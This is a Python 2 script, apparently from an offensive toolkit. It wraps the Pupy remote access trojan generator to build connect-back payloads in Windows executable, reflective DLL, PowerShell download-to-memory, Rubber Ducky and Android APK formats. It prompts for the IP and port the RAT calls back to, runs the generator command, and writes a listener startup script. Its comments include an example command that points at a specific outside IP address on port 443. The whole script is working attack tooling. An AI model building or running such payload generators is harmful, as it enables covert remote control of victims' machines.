#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

print 'The official repo appears to be missing the *.lin template but I will investigate further https://github.com/n1nj4sec/pupy/issues/206'
print 'That means Linux Executable payloads #s 5 to 8 will NOT work'
print 'But the standard Python payload #9 should work on both Linux and Macs, as well as Windows with the right runtimes installed'
print 'And payloads #s 1 to 4, and 10 to 14 will definitely work against a Windows Machine without a Python installation'
    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
	# - exe_86, exe_x64  : generate PE exe for windows

format_Dict = {
    '1': 'exe_x86',
    '2': 'exe_x64',
    '3': 'dll_x86',
    '4': 'dll_x64',
    '5': 'lin_x86',
    '6': 'lin_x64',
    '7': 'so_x86',
    '8': 'so_x64',
    '9': 'py',
    '10': 'pyinst',
    '11': 'py_oneliner',
    '12': 'ps1',
    '13': 'ps1_oneliner',
    '14': 'rubber_ducky',
    '15': 'apk'
}
	# - dll_86, dll_x64  : generate reflective dll for windows
	# - lin_x86, lin_x64 : generate a ELF binary for linux
	# - so_x86, so_x64   : generate a ELF .so for linux
	# - py               : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)
	# - pyinst           : generate a python file compatible with pyinstaller
	# - py_oneliner      : same as "py" format but served over http to load it from memory with a single command line.
	# - ps1              : generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process.
	# - ps1_oneliner     : load pupy remotely from memory with a single command line using powershell.
	# - rubber_ducky     : generate a Rubber Ducky script and inject.bin file (Windows Only).
	# - apk              : generate a apk for running pupy on android

format_List = [
    '\n\t1 Windows Executable 32-bit',
    '2 Windows Executable 64-bit',
    '3 Windows Reflective DLL Injection, 32-bit',
    '4 Windows Reflective DLL Injection, 64-bit',
    '5 Linux ELF Executable 32-bit',
    '6 Linux ELF Executable 64-bit',
    '7 Linux ELF Executable *.so format 32-bit',
    '8 Linux ELF Executable *.so format 64-bit',
    '9 Standalone Python *.py format',
    '10 Python pyinstaller wrapper file',
    '11 One-Liner HTTP Download-to-Memory Payload',
    '12 ps1 Powershell script, injects a pupy dll into a current process',
    '13 ps1 Remote Download Powershell-to-Pupy script',
    '14 Rubber Ducky Script and Injection binary file',
    '15 Generate a Android-Compatible Pupy APK installer'
]
#

transport_Dict = {
    '1': 'obfs3',
    '2': 'udp',
    '3': 'http',
    '4': 'tcp_cleartext',
    '5': 'rsa',
    '6': 'ssl',
    '7': 'udp_cleartext',
    '8': 'scramblesuit',
    '9': 'ssl_rsa'
}
transport_List = [
    '\n\t1 obfs3',
    '2 udp',
    '3 http',
    '4 tcp_cleartext',
    '5 rsa',
    '6 ssl',
    '7 udp_cleartext',
    '8 scramblesuit',
    '9 ssl_rsa'
]
print ("\n\t".join(format_List))
payload_Type = str(raw_input("Enter a NUMBER for payload type: "))
payload_Selected = format_Dict[payload_Type]
host_Connectback = str(raw_input("Enter the IP address where the RAT will connect back to: "))
host_Port = str(raw_input("Enter the PORT of the IP address to connect back to: "))
print ("\n\t".join(transport_List))
host_Transport = str(raw_input("Enter the TRANSPORT (PROTOCOL)"))

# Syntax error, found out that Pupy can only generate a payload if you navigate to the directory yourself.
# OTherwise it throws a file-not-found error

# FIXED, by moving the contents of /root/ArmsCommander/pupy/pupy to /root/ArmsCommander
# type cp -r (while in directory) ./* /root/ArmsCommander (second pupy directory tree)
# need to know this for the installer wizard
    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
cmd_String = "python /root/pupy/pupy/pupygen.py -f %s connect --host %s:%s -t %s" % (
    payload_Selected,
    host_Connectback,
    host_Port,
    transport_Dict[host_Transport]
    )
print colored(cmd_String,'red','on_white')
os.system('cd /root/ArmsCommander/pupy/pupy')
os.system(cmd_String)
print colored('Your payload is generated and is %s','red','on_white') % payload_Selected
print colored('Your server that it is set to listen on is %s','red','on_white') % host_Connectback
print colored('Your port that the payload is to connect back to is %s','red','on_white') % host_Port
print 'Remember all of this when you are going to start up your listener, handle just as if it was a regular Metasploit listener'
# Generates a script file that will run Pupy Server with the correct parameters
premade_startup_script_string = "sudo python /root/pupy/pupy/pupysh.py -t " + transport_Dict[host_Transport] + ' -p ' + host_Port
premade_startup_script_location = "/root/ArmsCommander/pupy_server_startup.sh"
saved_startup_file = open(premade_startup_script_location, 'w')
saved_startup_file.write(premade_startup_script_string)
saved_startup_file.close()

# Modifies file permissiosn in /root/ArmsCommander to allow the startup script to execute
os.system('chmod 777 /root/ArmsCommander/*')
print 'PREGENERATED SERVER STARTUP SCRIPT CREATED'
os.system('python /root/ArmsCommander/Pupy_Menu.py')
